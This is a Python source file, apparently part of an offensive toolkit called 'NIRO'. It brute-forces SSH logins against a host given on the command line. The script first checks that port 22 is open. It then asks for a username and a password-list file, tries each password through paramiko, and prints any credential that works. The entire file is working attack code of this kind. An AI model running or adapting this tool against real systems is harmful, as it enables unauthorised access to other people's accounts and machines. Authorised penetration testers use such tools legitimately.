import sys
import os.path
from os import path
import pyfiglet
import paramiko
from colorama import Fore
from Recon.scanPorts import probe_port

def login():
  global username
  global password_file
  username = str(input(Fore.BLUE+"[+] Enter Username : "+Fore.WHITE))
  password_file = str(input(Fore.BLUE+"[+] Enter password file location : "+Fore.WHITE))


def ssh_connect(password, code=0):
    ssh= paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
       ssh.connect( sys.argv[1] ,port=22,username = username, password=password)
    except paramiko.AuthenticationException :
       code = 1
    ssh.close()
    return code

def ssh_sprayingg():

  brute_force = pyfiglet.figlet_format("Password<->SPRAYING")
  print(Fore.MAGENTA+brute_force)

  print(Fore.CYAN+"===========================================================")
  print(Fore.WHITE + "[*-*] Starting NIRO in SSH Brute force mode ...")
  print(Fore.CYAN+"===========================================================")
  #login()
  #username = str(input(Fore.BLUE+"[+] Enter Username : "+Fore.WHITE))
  #password_file = str(input(Fore.BLUE+"[+] Enter password file location : "+Fore.WHITE))

  if probe_port(sys.argv[1],22) == 0:  #verification is port 22 open and then continue
        login()
        print(Fore.GREEN+" -----------------------")
        print("|   TCP PORT 22 OPEN    |")
        print(" -----------------------")
        if (path.exists(password_file) == True ):
          ssh_file = open(password_file).read()
          ssh_line = ssh_file.splitlines()
          for password in ssh_line:
                try :
                    res = ssh_connect(password)
                    print(Fore.YELLOW+"[!] ACCOUNT CHECK : [SSH] Host : "+sys.argv[1]+" Login : "+username+"/"+password)
                    if (res==0) :
                        print(Fore.GREEN+"[+] ACCOUNT FOUND : [SSH] Host : "+sys.argv[1]+" Login : "+username+"/"+password+" [SUCCESS]")
                        break
                except Exception as e :
                        print(e)
                        pass
        else :
           print(Fore.RED+"[-] INVALID FILE .")
  else:
    print(Fore.RED+"----------------------------")
    print("[!] 22/TCP SSH ---> CLOSED")
    print("----------------------------")

  print(Fore.RED+"---------------END OF SSH BruteForce-----------------")
